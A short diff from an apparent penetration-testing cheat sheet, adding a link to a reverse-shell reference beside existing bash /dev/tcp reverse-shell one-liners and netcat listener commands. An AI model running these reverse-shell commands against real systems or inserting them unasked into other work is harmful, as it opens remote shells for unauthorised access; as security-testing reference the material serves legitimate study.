@@ -105,6 +105,9 @@
     - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
     - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
   
+- **Reverse shell**
+  - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+
 - **Listener**
   - nc -nlvp PORT ==> TCP listener
   - nc -ulvnp PORT ==> UDP listener
